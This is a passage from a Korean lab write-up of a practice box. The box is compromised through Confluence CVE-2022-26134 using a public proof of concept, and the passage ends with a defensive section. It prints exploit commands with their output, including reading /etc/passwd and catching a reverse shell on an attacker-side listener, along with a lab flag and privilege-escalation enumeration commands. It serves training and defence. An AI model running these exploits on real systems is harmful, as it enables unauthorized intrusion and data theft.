/home/kali/PG/Flu/through_the_wire/through_the_wire.py:30: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__   ___  / / /\ \ (_)_ __ ___  ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:31: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:32: SyntaxWarning: invalid escape sequence '\ '
  print("   / /  | | | |  __/  \  /\  /| | | |  __/ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:33: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|\___|   \/  \/ |_|_|  \___| ")

   _____ _                           _
  /__   \ |__  _ __ ___  _   _  __ _| |__
    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \
   / /  | | | | | | (_) | |_| | (_| | | | |
   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|
                               |___/
   _____ _            __    __ _
  /__   \ |__   ___  / / /\ \ (_)_ __ ___
    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \
   / /  | | | |  __/  \  /\  /| | | |  __/
   \/   |_| |_|\___|   \/  \/ |_|_|  \___|

                 jbaines-r7
               CVE-2022-26134
      "Spit my soul through the wire"
                     🦞

[+] Forking a netcat listener
[+] Using /usr/bin/nc
[+] Generating a payload to read: /etc/passwd
[+] Sending expoit at http://192.168.103.41:8090/
listening on [any] 1270 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.103.41] 40720
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:106::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:101:1::/var/cache/pollinate:/bin/false
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
syslog:x:103:109::/nonexistent:/usr/sbin/nologin
uuidd:x:104:110::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:111::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:113::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:108:114:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:109:115:MySQL Server,,,:/nonexistent:/bin/false
confluence:x:1001:1001:Atlassian Confluence:/home/confluence:/bin/sh
```

> [!tip] `/etc/passwd` 에서 뽑아야 할 정보 — 여기서 실제로 건진 것
>
> | 줄 | 의미 |
> |---|---|
> | `confluence:x:1001:1001:...:/home/confluence:/bin/sh` | **UID 1001, 홈이 `/home/confluence`, 셸이 있다.** → `local.txt` 를 여기서 찾으면 된다 |
> | `lxd:x:999:100::/var/snap/lxd/...` | LXD **설치돼 있음**. 셸을 잡으면 `id` 로 내가 `lxd` 그룹인지 확인할 값어치가 있다 |
> | `mysql:x:109:115:MySQL Server` | MySQL 존재. Confluence의 DB 자격증명이 설정 파일에 평문으로 있을 수 있다 |
> | **일반 사용자가 `confluence` 뿐** | 횡이동 대상이 없다 → **권한상승은 곧바로 root를 노려야 한다** |
>
> ⚠️ `lxd` 그룹은 **가능성이지 사실이 아니다.** `/etc/passwd` 에 lxd 계정이 있다는 것은 LXD가 설치됐다는 뜻일 뿐, `confluence` 사용자가 `lxd` 그룹에 속한다는 증거가 **아니다.** 확인하려면 셸에서 `id` 를 쳐야 하는데 **그 기록이 남아 있지 않다**(§4).

### 3-3. 리버스셸

```bash
┌──(kali㉿kali)-[~/PG/Flu/through_the_wire]
└─$ python through_the_wire.py --rhost 192.168.103.41 --rport 8090 --lhost 192.168.45.244 --protocol http:// --reverse-shell
(배너 및 SyntaxWarning 동일 — 생략하지 않고 원문 그대로 아래에 이어진다)
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:24: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__  _ __ ___  _   _  __ _| |__  ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:25: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:27: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:30: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__   ___  / / /\ \ (_)_ __ ___  ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:31: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:32: SyntaxWarning: invalid escape sequence '\ '
  print("   / /  | | | |  __/  \  /\  /| | | |  __/ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:33: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|\___|   \/  \/ |_|_|  \___| ")

   _____ _                           _
  /__   \ |__  _ __ ___  _   _  __ _| |__
    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \
   / /  | | | | | | (_) | |_| | (_| | | | |
   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|
                               |___/
   _____ _            __    __ _
  /__   \ |__   ___  / / /\ \ (_)_ __ ___
    / /\/ '_ \ / _ \ \ \/  \/ / | '__/ _ \
   / /  | | | |  __/  \  /\  /| | | |  __/
   \/   |_| |_|\___|   \/  \/ |_|_|  \___|

                 jbaines-r7
               CVE-2022-26134
      "Spit my soul through the wire"
                     🦞

[+] Forking a netcat listener
[+] Using /usr/bin/nc
[+] Generating a reverse shell payload
[+] Sending expoit at http://192.168.103.41:8090/
listening on [any] 1270 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.103.41] 46170
bash: cannot set terminal process group (841): Inappropriate ioctl for device
bash: no job control in this shell
confluence@flu:/opt/atlassian/confluence/bin$ whoami
whoami
confluence
confluence@flu:/opt/atlassian/confluence/bin$
confluence@flu:/opt/atlassian/confluence$ cd /home/confluence
cd /home/confluence
confluence@flu:/home/confluence$ ls
ls
local.txt
confluence@flu:/home/confluence$ cat local.txt
cat local.txt
2d0c7239ce98c1add6986385f076c26e
confluence@flu:/home/confluence$
```

![[Pasted image 20260714142017.png]]

> [!note] 출력에서 읽을 것
> - `cannot set terminal process group` / `no job control` — **정상이다.** TTY 없이 붙은 셸의 표준 증상이다. `Ctrl-C` 가 셸을 죽이고 `su`·`ssh`·`sudo` 가 거부될 수 있으므로 TTY 업그레이드가 필요하다:
>   `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl-Z` → `stty raw -echo; fg` → `export TERM=xterm`
> - 명령이 두 번씩 보이는 것(`whoami` / `whoami`) — 로컬 에코다. 역시 TTY 부재의 증상이다
> - 시작 디렉터리가 `/opt/atlassian/confluence/bin` — **Confluence 프로세스의 CWD를 그대로 물려받았다**는 증거다. RCE가 서비스 프로세스 안에서 일어났음을 확인해 준다
> - 프롬프트가 `confluence@flu` — **root가 아니다.** 익스플로잇이 주는 권한은 곧 그 서비스의 실행 계정이다

> [!danger] 플래그는 대화형 셸에서 읽었다 — 이게 시험 요건이다
> OSCP는 **웹셸로 얻은 플래그를 0점 처리**한다. 규정 원문: *"this includes any type of web-based shell"*.
> 이 박스는 `nc` 리버스셸(대화형)에서 `cat local.txt` 했으므로 요건을 만족한다.
> 다만 **증거 스크린샷 형식은 미흡했다** — 시험이라면 `whoami; hostname; ip a; cat local.txt` 를 **한 화면에** 담아야 한다. 위 스크린샷에는 `ip a` 가 없다. [[Butch]] 참조.

---

## 4. 권한상승 — **미완**

> [!danger] 여기서부터는 기록이 없다
> 리버스셸 안에서 무엇을 쳤는지 **어떤 산출물에도 남아 있지 않다.** `~/.zsh_history` 는 Kali 로컬 셸의 기록이라 `nc` 세션 안의 입력을 담지 않는다.
> 그래서 **이 장에는 터미널 블록을 쓰지 않는다.** 열거 출력을 지어내는 것이 이 노트가 저지를 수 있는 최악의 일이다.
> 아래는 전부 **다음 세션의 작업 지시**이지 관측 기록이 아니다.

### 4-1. 셸을 잡자마자 쳤어야 할 5개

이 박스에서 실제로 쳤다는 증거가 없는 명령들이다. 다음에는 **셸이 붙은 그 자리에서** 친다:

1. `id` — 그룹이 전부다. `lxd`·`docker`·`disk`·`adm`·`sudo` 중 하나면 그 자리에서 끝난다
2. `sudo -l` — 비밀번호를 모르니 `NOPASSWD` 항목만 본다
3. `find / -perm -4000 -type f 2>/dev/null` — SUID
4. `getcap -r / 2>/dev/null` — capabilities (`cap_setuid`·`cap_dac_read_search`)
5. `cat /etc/crontab; ls -la /etc/cron.*` — 크론

### 4-2. 이 박스에 한정된 유력 후보 — 근거의 강도 순

`/etc/passwd` 에서 실제로 관측한 것에서만 출발한다:

| 후보 | 근거 | 강도 |
|---|---|---|
| **Confluence DB 자격증명 재사용** | `/opt/atlassian/confluence/confluence/WEB-INF/classes/confluence.cfg.xml` 에 DB 접속 정보가 **평문**으로 있다. `mysql` 계정이 `/etc/passwd` 에 실재한다. 거기서 나온 비밀번호를 `root` 에게 재사용해 본다 | **높음** — 셸의 CWD가 이미 `/opt/atlassian/confluence` 안이었다 |
| **`lxd` 그룹** | `/etc/passwd` 에 `lxd:x:999:100:...` 존재 | **낮음** — 설치 사실일 뿐 `confluence` 가 그 그룹인지 **모른다.** `id` 한 줄로 판정된다 |
| SUID / capabilities | 일반론 | 미확인 |
| 커널 익스플로잇 | nmap 추정 `Linux 5.0 - 5.14` | **가장 낮음** — 시험에서도 최후 수단이다 |

> [!warning] `--read-file /root/proof.txt` 는 답이 아니다 (§6-③)
> 익스플로잇의 파일 읽기는 **`confluence` 권한으로 실행된다.** `/root/proof.txt` 는 통상 `0600 root:root` 다.
> **파일 읽기 프리미티브는 권한 경계를 넘지 못한다.** 권한상승 없이는 root 플래그도 없다.

### 4-3. 손절 기준

Foothold까지 nmap 13:51 → 셸 14:20, 약 **30분**이다. Intermediate 박스로는 좋은 속도다.
문제는 그다음이다 — **시험이라면 여기서 권한상승에 60분을 배정하고, 위 5개를 순서대로 치고, 90분에 손절해 다음 박스로 갔어야 한다.** 이 박스는 그 배정 자체가 없었다.

---

## 5. 플래그

| 플래그 | 위치 | 값 | 방법 |
|---|---|---|---|
| `local.txt` | `/home/confluence/local.txt` | `2d0c7239ce98c1add6986385f076c26e` | CVE-2022-26134 리버스셸(대화형) |
| `proof.txt` | `/root/proof.txt` (추정 위치) | **미획득** | 권한상승 미완 |

---

## 6. 막혔던 지점 / 시행착오

> [!abstract] 이 장의 출처
> 아래 ①~⑥은 **Kali `~/.zsh_history` 에서 회수한 실제 명령**이다. 원본 노트에는 성공 경로만 적혀 있었다.
> 오류 문구는 **Kali에서 직접 재현해 확인**했다(② ③ 제외 — 그 둘은 재현 방법을 각 항목에 명시했다).

### ① `searchsploit` 이 7.13.6을 못 찾았다 — 그런데 답은 있었다

```bash
┌──(kali㉿kali)-[~/PG/Flu]
└─$ searchsploit atlassian 7.
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
AppFusions Doxygen for Atlassian Confluence 1.3.2 - Cross-Site Scri | java/webapps/40817.txt
Atlassian Confluence 7.12.2 - Pre-Authorization Arbitrary File Read | java/webapps/50377.txt
Atlassian Confluence < 8.5.3 - Remote Code Execution                | multiple/webapps/51904.py
Atlassian JIRA 3.7.3 - BrowseProject.JSPA Cross-Site Scripting      | jsp/webapps/29576.txt
Atlassian Tempo 6.4.3 / JIRA 5.0.0 / Gliffy 3.7.0 - XML Parsing Den | jsp/dos/37218.txt
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

![[Pasted image 20260714141054.png]]

**`searchsploit` 에 CVE-2022-26134 항목이 없다.** exploit-db에 없는 게 아니라 이 로컬 DB의 제목 색인에 안 잡혔을 뿐이다.

> [!tip] `searchsploit` 이 비면 GitHub으로 간다 — 검색어를 바꾸는 게 아니라 **채널을 바꾼다**
> 로컬 exploit-db는 exploit 세계의 부분집합이다. **CVE 번호를 손에 쥐었으면 `github.com` 에서 그 번호로 검색**하는 것이 다음 수다.
> 이 박스에서 실제로 그렇게 해서 `jbaines-r7/through_the_wire` 를 찾았다.
> 검색어 `searchsploit atlassian 7` / `atlassian 7.` / `atlassian` / `atlassian 7.13.6` 를 네 번 바꿔 가며 친 기록이 남아 있는데, **로컬 DB에 없는 것은 검색어를 아무리 바꿔도 안 나온다.**

![[Pasted image 20260714141017.png]]
![[Pasted image 20260714141213.png]]

### ② `searchsploit jamlink` — 포트 번호표를 검색했다

`~/.zsh_history` 에 남아 있는 명령이다:

```
searchsploit jamlink
```

§1-3에서 확인했듯 `jamlink` 는 `nmap-services` 의 **8091 포트 이름**이지 제품이 아니고, nmap도 `?` 를 붙여 "식별 실패"라고 말하고 있었다. 결과는 당연히 0건.

**놓친 진짜 단서는 같은 출력 안에 있었다** — `Server: Aleph/0.4.6`. 검색했어야 할 문자열은 `jamlink` 가 아니라 `Aleph` 였다.

> [!tip] 일반화 — nmap 출력에서 검색어를 뽑는 우선순위
> 1. **`fingerprint-strings` 안의 `Server:` / 배너 문자열** ← 실측된 것
> 2. **`http-title`·NSE 스크립트 출력** ← 실측된 것
> 3. VERSION 열 ← 실측된 것
> 4. ~~SERVICE 열에 `?` 가 붙은 이름~~ ← **실측이 아니다. 포트 번호로 조회한 표 이름이다**
>
> 소요 시간은 1~2분이었지만, 이 습관이 없으면 **없는 제품의 CVE를 30분 찾는다.**

### ③ `--read-file /root/proof.txt` — 무응답을 오독했다

```
python through_the_wire.py --rhost 192.168.103.41 --rport 8090 --lhost 192.168.45.244 --protocol http:// --read-file /root/proof.txt
```

`/etc/passwd` 가 성공한 **바로 다음 명령**이다. 파일 읽기가 되니 root 플래그도 바로 읽자는 발상인데, **읽기 권한이 없으니 될 리가 없다.**

이 실행의 출력은 남아 있지 않다. 다만 §2-4에서 **소스를 직접 읽어 확인한 실행 순서**(`readAllBytes()` → `new Socket()`)로부터, 결과가 무엇이었을지는 소스 수준에서 확정할 수 있다: **타겟이 Kali로 연결을 열지 못하므로 리스너에 아무것도 도착하지 않는다.** 배너와 `listening on [any] 1270 ...` 까지는 똑같이 찍히고 거기서 멈춘다.

> [!danger] 이 실패 모드가 왜 위험한가
> 성공했을 때와 **화면이 거의 같다.** 배너도, `[+] Sending expoit at ...` 도, `listening on ...` 도 전부 동일하다. 다른 것은 그 뒤에 아무 줄도 안 붙는다는 것뿐이다.
> 그래서 **"이 익스플로잇은 파일 읽기가 불안정한가 보다"** 로 오독하기 쉽다. 실제 의미는 **"권한이 없다 = 권한상승이 필요하다"** 였다.
>
> **판별법**: 읽을 수 있는 게 확실한 파일로 대조군을 세운다. `/etc/passwd` 가 오면 프리미티브는 멀쩡한 것이고, 그 상태에서 목표 파일만 안 오면 **원인은 권한 하나로 좁혀진다.**

### ④ `-rport` — 대시 하나가 빠졌다

```
python through_the_wire.py --rhost 192.168.103.41 -rport 8090 --lhost 192.168.45.244 --protocol http:// --read-file /etc/passwd   ← 실패
python through_the_wire.py --rhost 192.168.103.41 --rport 8090 --lhost 192.168.45.244 --protocol http:// --read-file /etc/passwd  ← 성공
```

`~/.zsh_history` 에 **연속된 두 줄**로 남아 있다. 같은 파서를 Kali에서 재현해 실제 문구를 확인했다:

```bash
┌──(kali㉿kali)-[/tmp]
└─$ python3 argtest.py --rhost 1.2.3.4 -rport 8090 --lhost 5.6.7.8 --protocol http:// --read-file /etc/passwd
usage: argtest.py [-h] --rhost RHOST [--rport RPORT] --lhost LHOST
                  [--lport LPORT] [--protocol PROTOCOL] [--reverse-shell]
                  [--fork-nc] [--nc-path NCPATH] [--read-file READ_FILE]
argtest.py: error: unrecognized arguments: -rport 8090
exit=2
```

> [!note] 이 오타가 **안전한 종류**인 이유 — 그리고 안 그럴 수도 있었던 이유
> `parse_args()` 가 **exit 2로 죽는다.** `os.fork()` 도 `requests.get()` 도 그 뒤에 있으므로 **패킷이 한 개도 안 나간다.**
> 만약 argparse가 `-rport` 를 조용히 삼켰다면 `rport` 는 기본값 **443**이 됐을 것이고, 열려 있지도 않은 포트로 던진 뒤 `[-] The HTTP request failed` 만 보고 **"익스플로잇이 안 통한다"고 오판**했을 것이다. 실제로 그 오판을 유발하는 것이 §2-5의 기본값 함정이다.
> **교훈: 익스플로잇이 "실패"하면 먼저 인자가 실제로 파싱됐는지 본다.** 스크립트를 고칠 필요도 없다 — 대부분 `--help` 한 번이면 끝난다.

### ⑤ 51904.py — 제목의 버전 범위에 속았다 (가장 값비싼 오판)

`~/.zsh_history` 에 남은 흐름이다:

```
searchsploit atlassian 7.13.6
searchsploit -m 51904
mv 51904.py ./PG/Flu
python 51904.py
vi 51904.py -u http://192.168.103.41:8090 -c whoami
vi 51904.py
```

`searchsploit` 이 보여준 제목은 **`Atlassian Confluence < 8.5.3 - Remote Code Execution`** 이었다. 7.13.6은 8.5.3보다 작으니 해당된다 — 고 읽은 것이다. **Kali의 실제 파일 헤더를 열어 보면 다르다:**

```bash
┌──(kali㉿kali)-[~]
└─$ head -8 /usr/share/exploitdb/exploits/multiple/webapps/51904.py
# Exploit Title: CVE-2023-22527: Atlassian Confluence RCE Vulnerability
# Date: 25/1/2024
# Exploit Author: MaanVader
# Vendor Homepage: https://www.atlassian.com/software/confluence
# Software Link: https://www.atlassian.com/software/confluence
# Version:  8.0.x, 8.1.x, 8.2.x, 8.3.x, 8.4.x, 8.5.0-8.5.3
# Tested on: 8.5.3
# CVE : CVE-2023-22527
```

> [!danger] `< 8.5.3` 은 **`8.0 ≤ v ≤ 8.5.3`** 이었다
> 실제 영향 범위는 **8.0.x부터**다. 7.13.6은 **애초에 대상이 아니다.**
> `searchsploit` 이 보여주는 것은 **exploit-db의 제목 문자열**이고, 그 제목은 저자가 요약하며 하한을 생략한 것이다.
> **제목은 색인이지 명세가 아니다.** 1분이면 되는 `head -10 <파일>` 로 반증된다.
>
> 이건 [[plum]] 에서 잡힌 것과 **같은 실패**다(SUID `exim4` → CVE-2019-10149(4.87–4.91)를 준비했으나 타겟은 4.94.2였다). 누적 교훈 8번·9번이 이 박스에서 다시 나온 것이다.

부가로 `vi 51904.py -u ... -c whoami` 는 **`python` 을 칠 자리에 `vi` 를 친 것**이다. vi가 `-u`(vimrc 지정)·`-c`(명령 실행) 를 **자기 플래그로 삼켜서** 엉뚱한 편집 세션이 열린다. 다음 줄이 그냥 `vi 51904.py` 인 것을 보면 바로 알아채고 나온 듯하다.

### ⑥ 51904를 두 번 받았다 — 그리고 그 이유가 중요하다

```
rm 51904.py                 ← 초반, through_the_wire 클론 직전
...
mv 51904.py ./PG/Flu        ← 후반, 셸을 잡은 뒤
```

같은 파일을 **버렸다가 다시 가져왔다.** 시점을 보면 이유가 보인다 — 후반의 재시도는 `--read-file /root/proof.txt` 가 실패한(③) **다음**이다. 즉 **"권한상승 수단"으로 익스플로잇을 하나 더 찾은 것**이다.

> [!warning] 방향 자체가 틀렸다
> 이미 `confluence` 로 **RCE를 가지고 있었다.** 같은 웹앱에 두 번째 웹 익스플로잇을 거는 것은 **같은 권한을 다시 얻는 일**이다. 성공해도 여전히 `confluence` 다.
> 필요했던 것은 **로컬 권한상승 열거**(§4-1)였다. `~/.zsh_history` 에 `cd linpeas` 가 한 줄 있는 것으로 보아 linpeas를 떠올리기는 했으나, 타겟에 올려 돌린 흔적은 없다.
>
> **일반화: 셸을 잡은 뒤에 웹 익스플로잇을 더 찾고 있다면 방향을 잘못 잡은 것이다.** 셸이 있으면 무기는 웹이 아니라 `id`·`sudo -l`·`find -perm -4000` 이다.

### ⑦ 시간 배분 — 어디서 손절했어야 하는가

| 구간 | 실제 | 시험이라면 |
|---|---|---|
| nmap `-p-` | 13:51–13:53 (129초) | 그대로 좋다 |
| 버전 판정 → 익스플로잇 확보 | 13:53–14:06 (~13분) | 좋다 |
| Foothold | 14:06–14:20 (~14분) | 좋다 |
| **권한상승** | **사실상 0분** | **여기에 60분을 배정했어야 한다** |

**Foothold까지 30분은 훌륭했다.** 실패는 속도가 아니라 **배분**이다. 웹 익스플로잇을 더 찾는 데 쓴 시간을 로컬 열거에 썼어야 했다.

### ⑧ 리버스셸이 안 붙었다면 무엇을 의심했을까 (이 박스에서는 한 번에 붙었다)

이 박스는 1270 포트로 즉시 붙었으므로 아래는 **관측된 문제가 아니라 점검 순서**다:

1. **`--lhost` 가 `tun0` IP 인가** — VPN IP는 세션마다 바뀐다. `ip -br a` 로 확인. (Clue에서 실제로 이걸로 태운 시간이 있다 → [[Clue]] §6)
2. **포트 충돌** — 이 스크립트는 `--fork-nc` 를 끌 수 없어 **항상** 1270을 잡는다(§2-5). 내 리스너가 이미 있으면 충돌한다
3. **아웃바운드 필터** — 1270 같은 비표준 포트가 막히면 `--lport 443`/`80` 으로 내린다
4. **`bash` 부재** — 페이로드가 `bash -c` 를 쓴다. 대상에 bash가 없으면 실패한다. 이 박스는 `/etc/passwd` 에 `root:...:/bin/bash` 가 있어 존재가 확인됐다

### ⑨ 버린 경로 — 8091 Aleph 와 22번 SSH를 왜 안 팠는가

열린 포트가 셋인데 실제로 판 것은 **8090 하나**다. 나머지 둘의 처리를 기록으로 남긴다.

**8091 (Aleph/0.4.6)** — 판단 근거는 nmap 지문 자체에 있다:

| 관측 | 의미 |
|---|---|
| 모든 GET에 `204 No Content` | **본문이 없다.** 열거할 표면이 없다 |
| `Access-Control-Allow-Origin: *` · `Allow-Methods: OPTIONS, GET, PUT, POST` | CORS가 활짝 열린 **API 엔드포인트**. UI가 아니다 |
| `Server: Aleph/0.4.6` | Clojure의 비동기 HTTP 서버 **라이브러리**. 제품이 아니라 프레임워크 이름이다 |
| 비정상 입력에 `414 Request-URI Too Long` | 자체 파서를 쓰는 커스텀 서비스 |

**즉 경로를 모르면 아무것도 못 한다.** `204` 만 돌려주는 API는 디렉터리 브루트포싱으로도 티가 안 난다 — 존재하는 경로와 없는 경로의 응답이 구분되지 않기 때문이다.
[가정] 이 박스의 설계상 8091은 장식이거나, 권한상승 단계에서 내부 정보를 얻은 뒤에야 의미가 생기는 요소로 보인다. **확인하지 못했다.**

> [!tip] `204` 만 돌려주는 서비스를 만났을 때
> 1. `OPTIONS` 로 허용 메서드를 본다 (여기서는 `PUT`·`POST` 가 열려 있었다 — **쓰기 가능성**)
> 2. `PUT` 으로 뭔가 올려 본다. CORS가 `*` 인 API는 인증이 없는 경우가 많다
> 3. 경로 힌트는 **다른 채널**에서 온다 — 8090의 HTML·JS, 설정 파일, 셸을 잡은 뒤의 프로세스 인자
>
> 이 박스에서는 3번을 할 기회(셸)가 있었는데도 안 했다. **셸을 잡은 뒤 `netstat -tulpn` 과 `ps aux` 로 8091의 정체를 확인했어야 한다.** [[Clue]] §4-2가 그걸 해서 포트를 5개 더 찾은 사례다.

**22 (OpenSSH 9.0p1)** — 자격증명이 없으니 손댈 것이 없다. 정상 판단이다. 다만 셸을 잡은 뒤에는 이야기가 다르다 — `/home/confluence/.ssh/` 와 `~/.bash_history` 를 봤어야 한다. **그 기록도 없다**(§4).

**포트 80이 아예 없다** — 웹 열거의 습관대로 `feroxbuster` 를 80에 돌리려다 없다는 것을 확인하는 데 시간을 쓸 수 있다. `-p-` 결과를 먼저 읽자.

---

## 7. OSCP 시험 관점

1. **`${...}` 를 만나면 표현식 주입을 의심한다.** OGNL(Confluence·Struts2)·SpEL·Freemarker·Velocity·Jinja2가 전부 한 가족이다. **`${7*7}` → `49` 가 판별 프로브다.**
2. **`.action` / `.do` 확장자는 Struts2·WebWork 신호다.** nmap의 `Requested resource was /login.action?...` 한 줄이 이 박스의 방향을 정했다.
3. **`?` 가 붙은 nmap SERVICE 이름을 제품으로 착각하지 마라.** 그건 포트 번호표다. 검색어는 `fingerprint-strings` 의 배너에서 뽑는다.
4. **searchsploit 제목의 버전 범위를 믿지 말고 파일 헤더를 열어라.** `head -10` 이면 된다. "`< 8.5.3`" 이 실제로는 "`8.0 ≤ v ≤ 8.5.3`" 이었다.
5. **`searchsploit` 이 비면 검색어가 아니라 채널을 바꿔라.** CVE 번호를 쥐었으면 GitHub이 다음 수다.
6. **리버스셸 전에 조용한 프리미티브로 RCE를 먼저 증명하라.** 파일 읽기가 되면 남은 변수는 네트워크뿐이라 원인 분리가 된다.
7. **파일 읽기 프리미티브는 권한 경계를 못 넘는다.** `/root/*` 를 읽으려는 시도는 권한상승의 대체재가 아니다.
8. **"아무것도 안 왔다" ≠ "파일이 없다".** 예외가 나면 침묵한다. 읽을 수 있는 게 확실한 파일로 **대조군**을 세워 원인을 좁혀라.
9. **익스플로잇이 주는 권한 = 서비스 실행 계정.** 셸을 잡은 순간 `id` 부터 친다. 웹 익스플로잇을 하나 더 찾고 있다면 방향이 틀린 것이다.
10. **셸을 잡자마자 칠 5개**: `id` · `sudo -l` · `find / -perm -4000 -type f 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab`
11. **자동 도구 없이 같은 결과를 얻는 법** — 이 박스는 자동 익스플로잇 도구를 쓰지 않았다. PoC 스크립트는 시험 허용이고, 굳이 손으로 하려면 `curl --path-as-is` 로 URL 인코딩한 OGNL 페이로드를 경로에 붙여 보내면 된다(닫는 `/` 를 잊지 말 것).
12. **`local.txt` 를 얻었다고 박스가 끝난 게 아니다.** 이 노트가 그 증거다 — 프론트매터는 `solved` 라고 적혀 있지만 **실제로는 1/2** 다.

---

## 8. 방어 관점

- **패치가 유일한 근본 대책이다.** CVE-2022-26134는 Confluence 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1 에서 수정됐다. 타겟의 **7.13.6은 7.13.7 바로 직전**이다 — 마이너 하나 차이로 열려 있었다.
- **서비스 계정 최소권한** — Confluence를 전용 `confluence` 계정으로 돌린 것 자체는 **잘 한 설정**이다. 그 덕에 RCE가 즉시 root가 되지 않았다.
- **아웃바운드 이그레스 필터링** — 이 익스플로잇은 타겟이 **밖으로 TCP를 열어야** 성립한다(리버스셸이든 파일 읽기든). 서버가 임의 목적지로 나가지 못하게 막으면 RCE가 나도 데이터가 안 빠진다.
- **관리 인터페이스를 인터넷에 두지 않기** — 8090을 VPN/내부망 뒤에 두었으면 미인증 결함의 노출면 자체가 없다.
- **탐지** — 액세스 로그의 URI에 `%24%7B`(= `${`) 나 `Class.forName` 이 보이면 그대로 침해 지표다. 경로 세그먼트가 비정상적으로 긴 요청도 마찬가지다.

---

## 9. 참고 자료

- **CVE-2022-26134** — Atlassian Confluence OGNL injection (미인증 RCE)
- 벤더 어드바이저리: https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
- 사용한 PoC: https://github.com/jbaines-r7/through_the_wire (Jacob Baines / Rapid7). 클론본: `~/PG/Flu/through_the_wire/`
- 막다른 길이었던 익스플로잇: EDB **51904** = **CVE-2023-22527** (Confluence 8.0.x–8.5.3, `/template/aui/text-inline.vm`) — **7.13.6에는 해당 없음**
- OGNL 명세(Apache Commons OGNL) — 표현식 언어의 메서드 호출 능력
- `nmap-services` (포트↔이름 표): `/usr/share/nmap/nmap-services`
- OSCP Exam Guide, "Exam Proofs" (웹셸 금지 조항): https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide

---

## 남긴 흔적 (랩 정리용)

- **리버스셸 프로세스** — `confluence` 사용자로 `bash -i` 가 남았다. 타겟이 정지돼 정리 여부를 재확인하지 못했다. [가정] 리버트로 소멸.
- **파일 업로드 없음** — 이 박스에는 도구를 올리지 않았다(그게 §6-⑥의 문제이기도 하다). 타겟 파일시스템에 쓴 것이 없다.
- **획득 자격증명** — 없음. 이 박스는 자격증명 없이 CVE만으로 뚫렸다.
- **미완** — `proof.txt`. 다음 세션의 첫 수는 **셸 재획득 후 `id`** 다.

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[_STATUS]] — 이 박스는 **부분 완료(1/2)** 로 등재돼 있다
- [[Clue]] — **같은 계열의 교훈이 가장 많은 박스.** 공개 PoC를 손으로 고쳐 쓰는 법, 리버스셸 `lhost` 오지정, exploit 헤더의 거짓 주석
- [[plum]] — 누적 패턴 **"익스플로잇 전에 버전 범위를 대조하라"**. 이 박스의 §6-⑤와 같은 실패
- [[Squid]] · [[Exfiltrated]] · [[Hawat]] — 누적 패턴 "인용이 깨지면 인코딩으로 도망간다". §2-3의 `bash -c` 래핑이 같은 계열
